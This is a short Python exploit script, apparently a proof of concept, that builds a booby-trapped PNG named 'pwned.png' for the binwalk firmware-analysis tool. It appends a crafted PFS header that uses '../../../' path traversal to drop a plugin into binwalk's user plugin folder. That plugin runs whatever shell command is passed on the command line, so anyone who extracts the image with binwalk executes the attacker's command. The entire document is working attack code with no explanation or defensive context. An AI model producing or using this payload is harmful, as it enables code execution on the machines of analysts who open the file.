#!/usr/bin/env python3

from PIL import Image
from sys import argv

# Create image and store content
image = Image.new('RGB', (100, 100), color='black')
image.save('temp.png')

with open('temp.png', 'rb') as file:
    img_content = file.read()

# Create PFS header and Plugin (PFS/0.9../../../.config/binwalk/plugins/binwalk.py4.)
pfs_header_hex = '5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e'
pfs_header_bytes = bytes.fromhex(pfs_header_hex)

content_plugin = """
import binwalk.core.plugin
class MaliciousExtractor(binwalk.core.plugin.Plugin):
   def init(self):
       __import__('os').system("{}")
""".format(argv[1])

# Insert all data to new image
with open('pwned.png', 'wb') as file:
    file.write(img_content)
    file.write(pfs_header_bytes)
    file.write(content_plugin.encode())

print('\n[+] Malicious file: pwned.png')